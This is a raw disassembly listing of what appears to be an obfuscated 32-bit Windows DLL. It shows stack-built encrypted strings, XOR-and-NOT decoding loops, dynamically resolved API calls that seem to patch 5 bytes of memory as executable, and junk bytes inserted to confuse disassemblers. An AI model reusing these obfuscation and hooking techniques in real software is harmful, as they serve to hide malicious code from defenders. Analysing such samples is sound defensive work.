1000880d:	c6 85 e6 f8 ff ff a7 	movb   $0xa7,-0x71a(%ebp)
10008814:	8d 85 d4 f8 ff ff    	lea    -0x72c(%ebp),%eax
1000881a:	50                   	push   %eax
1000881b:	e8 1d eb ff ff       	call   0x1000733d
10008820:	59                   	pop    %ecx
10008821:	50                   	push   %eax
10008822:	ff 75 18             	push   0x18(%ebp)
10008825:	ff 75 14             	push   0x14(%ebp)
10008828:	e8 c5 ea ff ff       	call   0x100072f2
1000882d:	83 c4 0c             	add    $0xc,%esp
10008830:	89 85 1c f9 ff ff    	mov    %eax,-0x6e4(%ebp)
10008836:	e8 f2 ea ff ff       	call   0x1000732d
1000883b:	23 08                	and    (%eax),%ecx
1000883d:	8d 65 8d             	lea    -0x73(%ebp),%esp
10008840:	85 e8                	test   %ebp,%eax
10008842:	f8                   	clc
10008843:	ff                   	(bad)
10008844:	ff 50 6a             	call   *0x6a(%eax)
10008847:	40                   	inc    %eax
10008848:	6a 05                	push   $0x5
1000884a:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
10008850:	ff 95 1c f9 ff ff    	call   *-0x6e4(%ebp)
10008856:	6a 05                	push   $0x5
10008858:	8d 85 6c fc ff ff    	lea    -0x394(%ebp),%eax
1000885e:	50                   	push   %eax
1000885f:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
10008865:	e8 34 ea ff ff       	call   0x1000729e
1000886a:	83 c4 0c             	add    $0xc,%esp
1000886d:	8d 85 e8 f8 ff ff    	lea    -0x718(%ebp),%eax
10008873:	50                   	push   %eax
10008874:	ff b5 e8 f8 ff ff    	push   -0x718(%ebp)
1000887a:	6a 05                	push   $0x5
1000887c:	ff b5 58 fc ff ff    	push   -0x3a8(%ebp)
10008882:	ff 95 1c f9 ff ff    	call   *-0x6e4(%ebp)
10008888:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
1000888f:	eb 0d                	jmp    0x1000889e
10008891:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008897:	40                   	inc    %eax
10008898:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
1000889e:	83 bd 00 f9 ff ff 05 	cmpl   $0x5,-0x700(%ebp)
100088a5:	7d 10                	jge    0x100088b7
100088a7:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
100088ad:	80 a4 05 6c fc ff ff 	andb   $0x0,-0x394(%ebp,%eax,1)
100088b4:	00 
100088b5:	eb da                	jmp    0x10008891
100088b7:	6a 04                	push   $0x4
100088b9:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
100088bf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100088c2:	8d 44 01 e8          	lea    -0x18(%ecx,%eax,1),%eax
100088c6:	50                   	push   %eax
100088c7:	8d 85 c0 fa ff ff    	lea    -0x540(%ebp),%eax
100088cd:	50                   	push   %eax
100088ce:	e8 cb e9 ff ff       	call   0x1000729e
100088d3:	83 c4 0c             	add    $0xc,%esp
100088d6:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
100088da:	8b 8d c0 fa ff ff    	mov    -0x540(%ebp),%ecx
100088e0:	2b c8                	sub    %eax,%ecx
100088e2:	89 8d c0 fa ff ff    	mov    %ecx,-0x540(%ebp)
100088e8:	e8 40 ea ff ff       	call   0x1000732d
100088ed:	e1 f7                	loope  0x100088e6
100088ef:	0d 0c 6a 04 8b       	or     $0x8b046a0c,%eax
100088f4:	85 88 fc ff ff 8b    	test   %ecx,-0x74000004(%eax)
100088fa:	4d                   	dec    %ebp
100088fb:	fc                   	cld
100088fc:	8d 44 01 ec          	lea    -0x14(%ecx,%eax,1),%eax
10008900:	50                   	push   %eax
10008901:	8d 45 f4             	lea    -0xc(%ebp),%eax
10008904:	50                   	push   %eax
10008905:	e8 94 e9 ff ff       	call   0x1000729e
1000890a:	83 c4 0c             	add    $0xc,%esp
1000890d:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
10008911:	8b 4d f4             	mov    -0xc(%ebp),%ecx
10008914:	2b c8                	sub    %eax,%ecx
10008916:	89 4d f4             	mov    %ecx,-0xc(%ebp)
10008919:	6a 04                	push   $0x4
1000891b:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
10008921:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008924:	8d 44 01 f0          	lea    -0x10(%ecx,%eax,1),%eax
10008928:	50                   	push   %eax
10008929:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
1000892f:	50                   	push   %eax
10008930:	e8 69 e9 ff ff       	call   0x1000729e
10008935:	83 c4 0c             	add    $0xc,%esp
10008938:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
1000893c:	8b 8d 00 fc ff ff    	mov    -0x400(%ebp),%ecx
10008942:	2b c8                	sub    %eax,%ecx
10008944:	89 8d 00 fc ff ff    	mov    %ecx,-0x400(%ebp)
1000894a:	6a 04                	push   $0x4
1000894c:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
10008952:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008955:	8d 44 01 f4          	lea    -0xc(%ecx,%eax,1),%eax
10008959:	50                   	push   %eax
1000895a:	8d 85 b4 fa ff ff    	lea    -0x54c(%ebp),%eax
10008960:	50                   	push   %eax
10008961:	e8 38 e9 ff ff       	call   0x1000729e
10008966:	83 c4 0c             	add    $0xc,%esp
10008969:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
1000896d:	8b 8d b4 fa ff ff    	mov    -0x54c(%ebp),%ecx
10008973:	2b c8                	sub    %eax,%ecx
10008975:	89 8d b4 fa ff ff    	mov    %ecx,-0x54c(%ebp)
1000897b:	6a 04                	push   $0x4
1000897d:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
10008983:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008986:	8d 44 01 f8          	lea    -0x8(%ecx,%eax,1),%eax
1000898a:	50                   	push   %eax
1000898b:	8d 85 7c f9 ff ff    	lea    -0x684(%ebp),%eax
10008991:	50                   	push   %eax
10008992:	e8 07 e9 ff ff       	call   0x1000729e
10008997:	83 c4 0c             	add    $0xc,%esp
1000899a:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
1000899e:	8b 8d 7c f9 ff ff    	mov    -0x684(%ebp),%ecx
100089a4:	2b c8                	sub    %eax,%ecx
100089a6:	89 8d 7c f9 ff ff    	mov    %ecx,-0x684(%ebp)
100089ac:	6a 04                	push   $0x4
100089ae:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
100089b4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
100089b7:	8d 44 01 fc          	lea    -0x4(%ecx,%eax,1),%eax
100089bb:	50                   	push   %eax
100089bc:	8d 85 88 f9 ff ff    	lea    -0x678(%ebp),%eax
100089c2:	50                   	push   %eax
100089c3:	e8 d6 e8 ff ff       	call   0x1000729e
100089c8:	83 c4 0c             	add    $0xc,%esp
100089cb:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
100089cf:	8b 8d 88 f9 ff ff    	mov    -0x678(%ebp),%ecx
100089d5:	2b c8                	sub    %eax,%ecx
100089d7:	89 8d 88 f9 ff ff    	mov    %ecx,-0x678(%ebp)
100089dd:	6a 04                	push   $0x4
100089df:	8b 45 fc             	mov    -0x4(%ebp),%eax
100089e2:	03 85 88 f9 ff ff    	add    -0x678(%ebp),%eax
100089e8:	50                   	push   %eax
100089e9:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
100089ef:	50                   	push   %eax
100089f0:	e8 a9 e8 ff ff       	call   0x1000729e
100089f5:	83 c4 0c             	add    $0xc,%esp
100089f8:	8b 85 74 fc ff ff    	mov    -0x38c(%ebp),%eax
100089fe:	8b 8d 88 f9 ff ff    	mov    -0x678(%ebp),%ecx
10008a04:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
10008a08:	89 85 54 fc ff ff    	mov    %eax,-0x3ac(%ebp)
10008a0e:	6a 04                	push   $0x4
10008a10:	8b 45 fc             	mov    -0x4(%ebp),%eax
10008a13:	03 85 54 fc ff ff    	add    -0x3ac(%ebp),%eax
10008a19:	50                   	push   %eax
10008a1a:	8d 85 78 f9 ff ff    	lea    -0x688(%ebp),%eax
10008a20:	50                   	push   %eax
10008a21:	e8 78 e8 ff ff       	call   0x1000729e
10008a26:	83 c4 0c             	add    $0xc,%esp
10008a29:	8b 85 88 f9 ff ff    	mov    -0x678(%ebp),%eax
10008a2f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008a32:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
10008a36:	89 85 b8 f8 ff ff    	mov    %eax,-0x748(%ebp)
10008a3c:	8b 85 54 fc ff ff    	mov    -0x3ac(%ebp),%eax
10008a42:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008a45:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
10008a49:	89 85 08 f9 ff ff    	mov    %eax,-0x6f8(%ebp)
10008a4f:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
10008a56:	eb 0d                	jmp    0x10008a65
10008a58:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008a5e:	40                   	inc    %eax
10008a5f:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
10008a65:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008a6b:	3b 85 74 fc ff ff    	cmp    -0x38c(%ebp),%eax
10008a71:	73 44                	jae    0x10008ab7
10008a73:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
10008a79:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
10008a7f:	0f be 00             	movsbl (%eax),%eax
10008a82:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
10008a86:	33 c1                	xor    %ecx,%eax
10008a88:	8b 8d b8 f8 ff ff    	mov    -0x748(%ebp),%ecx
10008a8e:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
10008a94:	88 01                	mov    %al,(%ecx)
10008a96:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
10008a9c:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
10008aa2:	0f be 00             	movsbl (%eax),%eax
10008aa5:	f7 d0                	not    %eax
10008aa7:	8b 8d b8 f8 ff ff    	mov    -0x748(%ebp),%ecx
10008aad:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
10008ab3:	88 01                	mov    %al,(%ecx)
10008ab5:	eb a1                	jmp    0x10008a58
10008ab7:	e8 71 e8 ff ff       	call   0x1000732d
10008abc:	46                   	inc    %esi
10008abd:	e5 05                	in     $0x5,%eax
10008abf:	24 83                	and    $0x83,%al
10008ac1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10008ac2:	00 f9                	add    %bh,%cl
10008ac4:	ff                   	(bad)
10008ac5:	ff 00                	incl   (%eax)
10008ac7:	eb 0d                	jmp    0x10008ad6
10008ac9:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008acf:	40                   	inc    %eax
10008ad0:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
10008ad6:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
10008adc:	3b 85 78 f9 ff ff    	cmp    -0x688(%ebp),%eax
10008ae2:	73 44                	jae    0x10008b28
10008ae4:	8b 85 08 f9 ff ff    	mov    -0x6f8(%ebp),%eax
10008aea:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
10008af0:	0f be 00             	movsbl (%eax),%eax
10008af3:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
10008af7:	33 c1                	xor    %ecx,%eax
10008af9:	8b 8d 08 f9 ff ff    	mov    -0x6f8(%ebp),%ecx
10008aff:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
10008b05:	88 01                	mov    %al,(%ecx)
10008b07:	8b 85 08 f9 ff ff    	mov    -0x6f8(%ebp),%eax
10008b0d:	03 85 00 f9 ff ff    	add    -0x700(%ebp),%eax
10008b13:	0f be 00             	movsbl (%eax),%eax
10008b16:	f7 d0                	not    %eax
10008b18:	8b 8d 08 f9 ff ff    	mov    -0x6f8(%ebp),%ecx
10008b1e:	03 8d 00 f9 ff ff    	add    -0x700(%ebp),%ecx
10008b24:	88 01                	mov    %al,(%ecx)
10008b26:	eb a1                	jmp    0x10008ac9
10008b28:	e8 00 e8 ff ff       	call   0x1000732d
10008b2d:	27                   	daa
10008b2e:	3e a7                	cmpsl  %es:(%edi),%ds:(%esi)
10008b30:	7a 80                	jp     0x10008ab2
10008b32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10008b33:	ec                   	in     (%dx),%al
10008b34:	f8                   	clc
10008b35:	ff                   	(bad)
10008b36:	ff 00                	incl   (%eax)
10008b38:	80 a5 ed f8 ff ff 00 	andb   $0x0,-0x713(%ebp)
10008b3f:	c6 85 ee f8 ff ff 5c 	movb   $0x5c,-0x712(%ebp)
10008b46:	80 a5 ef f8 ff ff 00 	andb   $0x0,-0x711(%ebp)
10008b4d:	c6 85 f0 f8 ff ff e5 	movb   $0xe5,-0x710(%ebp)
10008b54:	c6 85 f1 f8 ff ff cf 	movb   $0xcf,-0x70f(%ebp)
10008b5b:	c6 85 f2 f8 ff ff cc 	movb   $0xcc,-0x70e(%ebp)
10008b62:	c6 85 f3 f8 ff ff cc 	movb   $0xcc,-0x70d(%ebp)
10008b69:	c6 85 f4 f8 ff ff c7 	movb   $0xc7,-0x70c(%ebp)
10008b70:	c6 85 f5 f8 ff ff e5 	movb   $0xe5,-0x70b(%ebp)
10008b77:	c6 85 f6 f8 ff ff ca 	movb   $0xca,-0x70a(%ebp)
10008b7e:	c6 85 f7 f8 ff ff db 	movb   $0xdb,-0x709(%ebp)
10008b85:	c6 85 f8 f8 ff ff 91 	movb   $0x91,-0x708(%ebp)
10008b8c:	c6 85 f9 f8 ff ff a3 	movb   $0xa3,-0x707(%ebp)
10008b93:	80 a5 bc f8 ff ff 00 	andb   $0x0,-0x744(%ebp)
10008b9a:	80 a5 bd f8 ff ff 00 	andb   $0x0,-0x743(%ebp)
10008ba1:	c6 85 be f8 ff ff 0b 	movb   $0xb,-0x742(%ebp)
10008ba8:	80 a5 bf f8 ff ff 00 	andb   $0x0,-0x741(%ebp)
10008baf:	c6 85 c0 f8 ff ff b8 	movb   $0xb8,-0x740(%ebp)
10008bb6:	c6 85 c1 f8 ff ff 9b 	movb   $0x9b,-0x73f(%ebp)
10008bbd:	c6 85 c2 f8 ff ff 95 	movb   $0x95,-0x73e(%ebp)
10008bc4:	c6 85 c3 f8 ff ff 90 	movb   $0x90,-0x73d(%ebp)
10008bcb:	c6 85 c4 f8 ff ff b8 	movb   $0xb8,-0x73c(%ebp)
10008bd2:	c6 85 c5 f8 ff ff 9d 	movb   $0x9d,-0x73b(%ebp)
10008bd9:	c6 85 c6 f8 ff ff 96 	movb   $0x96,-0x73a(%ebp)
10008be0:	c6 85 c7 f8 ff ff 86 	movb   $0x86,-0x739(%ebp)
10008be7:	c6 85 c8 f8 ff ff 95 	movb   $0x95,-0x738(%ebp)
10008bee:	c6 85 c9 f8 ff ff 86 	movb   $0x86,-0x737(%ebp)
10008bf5:	c6 85 ca f8 ff ff 8d 	movb   $0x8d,-0x736(%ebp)
10008bfc:	c6 85 cb f8 ff ff b5 	movb   $0xb5,-0x735(%ebp)
10008c03:	c6 85 cc f8 ff ff f4 	movb   $0xf4,-0x734(%ebp)
10008c0a:	e8 1e e7 ff ff       	call   0x1000732d
10008c0f:	bc bc c6 3a 8d       	mov    $0x8d3ac6bc,%esp
10008c14:	85 bc f8 ff ff 50 e8 	test   %edi,-0x17af0001(%eax,%edi,8)
10008c1b:	1e                   	push   %ds
10008c1c:	e7 ff                	out    %eax,$0xff
10008c1e:	ff 59 50             	lcall  *0x50(%ecx)
10008c21:	ff 75 18             	push   0x18(%ebp)
10008c24:	ff 75 14             	push   0x14(%ebp)
10008c27:	e8 c6 e6 ff ff       	call   0x100072f2
10008c2c:	83 c4 0c             	add    $0xc,%esp
10008c2f:	89 85 fc f8 ff ff    	mov    %eax,-0x704(%ebp)
10008c35:	80 a5 0c f9 ff ff 00 	andb   $0x0,-0x6f4(%ebp)
10008c3c:	80 a5 0d f9 ff ff 00 	andb   $0x0,-0x6f3(%ebp)
10008c43:	c6 85 0e f9 ff ff 16 	movb   $0x16,-0x6f2(%ebp)
10008c4a:	80 a5 0f f9 ff ff 00 	andb   $0x0,-0x6f1(%ebp)
10008c51:	c6 85 10 f9 ff ff be 	movb   $0xbe,-0x6f0(%ebp)
10008c58:	c6 85 11 f9 ff ff 9b 	movb   $0x9b,-0x6ef(%ebp)
10008c5f:	c6 85 12 f9 ff ff 80 	movb   $0x80,-0x6ee(%ebp)
10008c66:	c6 85 13 f9 ff ff 9d 	movb   $0x9d,-0x6ed(%ebp)
10008c6d:	c6 85 14 f9 ff ff 8c 	movb   $0x8c,-0x6ec(%ebp)
10008c74:	c6 85 15 f9 ff ff af 	movb   $0xaf,-0x6eb(%ebp)
10008c7b:	c6 85 16 f9 ff ff 80 	movb   $0x80,-0x6ea(%ebp)
10008c82:	c6 85 17 f9 ff ff 85 	movb   $0x85,-0x6e9(%ebp)
10008c89:	c6 85 18 f9 ff ff 8c 	movb   $0x8c,-0x6e8(%ebp)
10008c90:	c6 85 19 f9 ff ff e9 	movb   $0xe9,-0x6e7(%ebp)
10008c97:	8d 85 0c f9 ff ff    	lea    -0x6f4(%ebp),%eax
10008c9d:	50                   	push   %eax
10008c9e:	e8 9a e6 ff ff       	call   0x1000733d
10008ca3:	59                   	pop    %ecx
10008ca4:	50                   	push   %eax
10008ca5:	ff 75 18             	push   0x18(%ebp)
10008ca8:	ff 75 14             	push   0x14(%ebp)
10008cab:	e8 42 e6 ff ff       	call   0x100072f2
10008cb0:	83 c4 0c             	add    $0xc,%esp
10008cb3:	89 85 d0 f8 ff ff    	mov    %eax,-0x730(%ebp)
10008cb9:	83 a5 04 f9 ff ff 00 	andl   $0x0,-0x6fc(%ebp)
10008cc0:	6a 01                	push   $0x1
10008cc2:	58                   	pop    %eax
10008cc3:	85 c0                	test   %eax,%eax
10008cc5:	0f 84 02 07 00 00    	je     0x100093cd
10008ccb:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
10008cd1:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
10008cd7:	83 bd 04 f9 ff ff 00 	cmpl   $0x0,-0x6fc(%ebp)
10008cde:	0f 85 b5 01 00 00    	jne    0x10008e99
10008ce4:	80 a5 84 f8 ff ff 00 	andb   $0x0,-0x77c(%ebp)
10008ceb:	80 a5 85 f8 ff ff 00 	andb   $0x0,-0x77b(%ebp)
10008cf2:	c6 85 86 f8 ff ff d2 	movb   $0xd2,-0x77a(%ebp)
10008cf9:	80 a5 87 f8 ff ff 00 	andb   $0x0,-0x779(%ebp)
10008d00:	c6 85 88 f8 ff ff 6e 	movb   $0x6e,-0x778(%ebp)
10008d07:	c6 85 89 f8 ff ff 17 	movb   $0x17,-0x777(%ebp)
10008d0e:	c6 85 8a f8 ff ff 71 	movb   $0x71,-0x776(%ebp)
10008d15:	c6 85 8b f8 ff ff 7d 	movb   $0x7d,-0x775(%ebp)
10008d1c:	c6 85 8c f8 ff ff 5f 	movb   $0x5f,-0x774(%ebp)
10008d23:	c6 85 8d f8 ff ff 42 	movb   $0x42,-0x773(%ebp)
10008d2a:	c6 85 8e f8 ff ff 4a 	movb   $0x4a,-0x772(%ebp)
10008d31:	c6 85 8f f8 ff ff 5f 	movb   $0x5f,-0x771(%ebp)
10008d38:	c6 85 90 f8 ff ff 4c 	movb   $0x4c,-0x770(%ebp)
10008d3f:	c6 85 91 f8 ff ff 40 	movb   $0x40,-0x76f(%ebp)
10008d46:	c6 85 92 f8 ff ff 0d 	movb   $0xd,-0x76e(%ebp)
10008d4d:	c6 85 93 f8 ff ff 6b 	movb   $0x6b,-0x76d(%ebp)
10008d54:	c6 85 94 f8 ff ff 44 	movb   $0x44,-0x76c(%ebp)
10008d5b:	c6 85 95 f8 ff ff 41 	movb   $0x41,-0x76b(%ebp)
10008d62:	c6 85 96 f8 ff ff 48 	movb   $0x48,-0x76a(%ebp)
10008d69:	c6 85 97 f8 ff ff 5e 	movb   $0x5e,-0x769(%ebp)
10008d70:	c6 85 98 f8 ff ff 71 	movb   $0x71,-0x768(%ebp)
10008d77:	c6 85 99 f8 ff ff 6e 	movb   $0x6e,-0x767(%ebp)
10008d7e:	c6 85 9a f8 ff ff 42 	movb   $0x42,-0x766(%ebp)
10008d85:	c6 85 9b f8 ff ff 40 	movb   $0x40,-0x765(%ebp)
10008d8c:	c6 85 9c f8 ff ff 40 	movb   $0x40,-0x764(%ebp)
10008d93:	c6 85 9d f8 ff ff 42 	movb   $0x42,-0x763(%ebp)
10008d9a:	c6 85 9e f8 ff ff 43 	movb   $0x43,-0x762(%ebp)
10008da1:	c6 85 9f f8 ff ff 0d 	movb   $0xd,-0x761(%ebp)
10008da8:	c6 85 a0 f8 ff ff 6b 	movb   $0x6b,-0x760(%ebp)
10008daf:	c6 85 a1 f8 ff ff 44 	movb   $0x44,-0x75f(%ebp)
10008db6:	c6 85 a2 f8 ff ff 41 	movb   $0x41,-0x75e(%ebp)
10008dbd:	c6 85 a3 f8 ff ff 48 	movb   $0x48,-0x75d(%ebp)
10008dc4:	c6 85 a4 f8 ff ff 5e 	movb   $0x5e,-0x75c(%ebp)
10008dcb:	c6 85 a5 f8 ff ff 71 	movb   $0x71,-0x75b(%ebp)
10008dd2:	c6 85 a6 f8 ff ff 7e 	movb   $0x7e,-0x75a(%ebp)
10008dd9:	c6 85 a7 f8 ff ff 54 	movb   $0x54,-0x759(%ebp)
10008de0:	c6 85 a8 f8 ff ff 5e 	movb   $0x5e,-0x758(%ebp)
10008de7:	c6 85 a9 f8 ff ff 59 	movb   $0x59,-0x757(%ebp)
10008dee:	c6 85 aa f8 ff ff 48 	movb   $0x48,-0x756(%ebp)
10008df5:	c6 85 ab f8 ff ff 40 	movb   $0x40,-0x755(%ebp)
10008dfc:	c6 85 ac f8 ff ff 71 	movb   $0x71,-0x754(%ebp)
10008e03:	c6 85 ad f8 ff ff 5e 	movb   $0x5e,-0x753(%ebp)
10008e0a:	c6 85 ae f8 ff ff 54 	movb   $0x54,-0x752(%ebp)
10008e11:	c6 85 af f8 ff ff 40 	movb   $0x40,-0x751(%ebp)
10008e18:	c6 85 b0 f8 ff ff 5e 	movb   $0x5e,-0x750(%ebp)
10008e1f:	c6 85 b1 f8 ff ff 5f 	movb   $0x5f,-0x74f(%ebp)
10008e26:	c6 85 b2 f8 ff ff 5b 	movb   $0x5b,-0x74e(%ebp)
10008e2d:	c6 85 b3 f8 ff ff 03 	movb   $0x3,-0x74d(%ebp)
10008e34:	c6 85 b4 f8 ff ff 49 	movb   $0x49,-0x74c(%ebp)
10008e3b:	c6 85 b5 f8 ff ff 41 	movb   $0x41,-0x74b(%ebp)
10008e42:	c6 85 b6 f8 ff ff 41 	movb   $0x41,-0x74a(%ebp)
10008e49:	c6 85 b7 f8 ff ff 2d 	movb   $0x2d,-0x749(%ebp)
10008e50:	8d 85 84 f8 ff ff    	lea    -0x77c(%ebp),%eax
10008e56:	50                   	push   %eax
10008e57:	e8 e1 e4 ff ff       	call   0x1000733d
10008e5c:	59                   	pop    %ecx
10008e5d:	8a 85 d4 fe ff ff    	mov    -0x12c(%ebp),%al
10008e63:	88 85 88 f8 ff ff    	mov    %al,-0x778(%ebp)
10008e69:	6a 30                	push   $0x30
10008e6b:	8d 85 84 f8 ff ff    	lea    -0x77c(%ebp),%eax
10008e71:	50                   	push   %eax
10008e72:	e8 c6 e4 ff ff       	call   0x1000733d
10008e77:	59                   	pop    %ecx
10008e78:	50                   	push   %eax
10008e79:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
10008e7f:	50                   	push   %eax
10008e80:	e8 19 e4 ff ff       	call   0x1000729e
10008e85:	83 c4 0c             	add    $0xc,%esp
10008e88:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
10008e8e:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
10008e94:	e9 06 04 00 00       	jmp    0x1000929f
10008e99:	83 bd 04 f9 ff ff 01 	cmpl   $0x1,-0x6fc(%ebp)
10008ea0:	0f 85 ad 00 00 00    	jne    0x10008f53
10008ea6:	80 a5 74 f8 ff ff 00 	andb   $0x0,-0x78c(%ebp)
10008ead:	80 a5 75 f8 ff ff 00 	andb   $0x0,-0x78b(%ebp)
10008eb4:	c6 85 76 f8 ff ff 5f 	movb   $0x5f,-0x78a(%ebp)
10008ebb:	80 a5 77 f8 ff ff 00 	andb   $0x0,-0x789(%ebp)
10008ec2:	c6 85 78 f8 ff ff fc 	movb   $0xfc,-0x788(%ebp)
10008ec9:	c6 85 79 f8 ff ff c4 	movb   $0xc4,-0x787(%ebp)
10008ed0:	c6 85 7a f8 ff ff cc 	movb   $0xcc,-0x786(%ebp)
10008ed7:	c6 85 7b f8 ff ff c3 	movb   $0xc3,-0x785(%ebp)
10008ede:	c6 85 7c f8 ff ff cf 	movb   $0xcf,-0x784(%ebp)
10008ee5:	c6 85 7d f8 ff ff c5 	movb   $0xc5,-0x783(%ebp)
10008eec:	c6 85 7e f8 ff ff d2 	movb   $0xd2,-0x782(%ebp)
10008ef3:	c6 85 7f f8 ff ff 8e 	movb   $0x8e,-0x781(%ebp)
10008efa:	c6 85 80 f8 ff ff c4 	movb   $0xc4,-0x780(%ebp)
10008f01:	c6 85 81 f8 ff ff cc 	movb   $0xcc,-0x77f(%ebp)
10008f08:	c6 85 82 f8 ff ff cc 	movb   $0xcc,-0x77e(%ebp)
10008f0f:	c6 85 83 f8 ff ff a0 	movb   $0xa0,-0x77d(%ebp)
10008f16:	e8 12 e4 ff ff       	call   0x1000732d
10008f1b:	e1 84                	loope  0x10008ea1
10008f1d:	2d 31 6a 0c 8d       	sub    $0x8d0c6a31,%eax
10008f22:	85 74 f8 ff          	test   %esi,-0x1(%eax,%edi,8)
10008f26:	ff 50 e8             	call   *-0x18(%eax)
10008f29:	10 e4                	adc    %ah,%ah
10008f2b:	ff                   	(bad)
10008f2c:	ff 59 50             	lcall  *0x50(%ecx)
10008f2f:	8b 45 d8             	mov    -0x28(%ebp),%eax
10008f32:	8d 84 05 d4 fe ff ff 	lea    -0x12c(%ebp,%eax,1),%eax
10008f39:	50                   	push   %eax
10008f3a:	e8 5f e3 ff ff       	call   0x1000729e
10008f3f:	83 c4 0c             	add    $0xc,%esp
10008f42:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
10008f48:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
10008f4e:	e9 4c 03 00 00       	jmp    0x1000929f
10008f53:	83 bd 04 f9 ff ff 02 	cmpl   $0x2,-0x6fc(%ebp)
10008f5a:	0f 85 a7 00 00 00    	jne    0x10009007
10008f60:	80 a5 64 f8 ff ff 00 	andb   $0x0,-0x79c(%ebp)
10008f67:	80 a5 65 f8 ff ff 00 	andb   $0x0,-0x79b(%ebp)
10008f6e:	c6 85 66 f8 ff ff a9 	movb   $0xa9,-0x79a(%ebp)
10008f75:	80 a5 67 f8 ff ff 00 	andb   $0x0,-0x799(%ebp)
10008f7c:	c6 85 68 f8 ff ff 0a 	movb   $0xa,-0x798(%ebp)
10008f83:	c6 85 69 f8 ff ff 35 	movb   $0x35,-0x797(%ebp)
10008f8a:	c6 85 6a f8 ff ff 39 	movb   $0x39,-0x796(%ebp)
10008f91:	c6 85 6b f8 ff ff 38 	movb   $0x38,-0x795(%ebp)
10008f98:	c6 85 6c f8 ff ff 24 	movb   $0x24,-0x794(%ebp)
10008f9f:	c6 85 6d f8 ff ff 33 	movb   $0x33,-0x793(%ebp)
10008fa6:	c6 85 6e f8 ff ff 25 	movb   $0x25,-0x792(%ebp)
10008fad:	c6 85 6f f8 ff ff 78 	movb   $0x78,-0x791(%ebp)
10008fb4:	c6 85 70 f8 ff ff 32 	movb   $0x32,-0x790(%ebp)
10008fbb:	c6 85 71 f8 ff ff 3a 	movb   $0x3a,-0x78f(%ebp)
10008fc2:	c6 85 72 f8 ff ff 3a 	movb   $0x3a,-0x78e(%ebp)
10008fc9:	c6 85 73 f8 ff ff 56 	movb   $0x56,-0x78d(%ebp)
10008fd0:	6a 0c                	push   $0xc
10008fd2:	8d 85 64 f8 ff ff    	lea    -0x79c(%ebp),%eax
10008fd8:	50                   	push   %eax
10008fd9:	e8 5f e3 ff ff       	call   0x1000733d
10008fde:	59                   	pop    %ecx
10008fdf:	50                   	push   %eax
10008fe0:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
10008fe6:	8d 84 05 ac f9 ff ff 	lea    -0x654(%ebp,%eax,1),%eax
10008fed:	50                   	push   %eax
10008fee:	e8 ab e2 ff ff       	call   0x1000729e
10008ff3:	83 c4 0c             	add    $0xc,%esp
10008ff6:	8d 85 ac f9 ff ff    	lea    -0x654(%ebp),%eax
10008ffc:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
10009002:	e9 98 02 00 00       	jmp    0x1000929f
10009007:	83 bd 04 f9 ff ff 03 	cmpl   $0x3,-0x6fc(%ebp)
1000900e:	0f 85 94 00 00 00    	jne    0x100090a8
10009014:	80 a5 54 f8 ff ff 00 	andb   $0x0,-0x7ac(%ebp)
1000901b:	80 a5 55 f8 ff ff 00 	andb   $0x0,-0x7ab(%ebp)
10009022:	c6 85 56 f8 ff ff 50 	movb   $0x50,-0x7aa(%ebp)
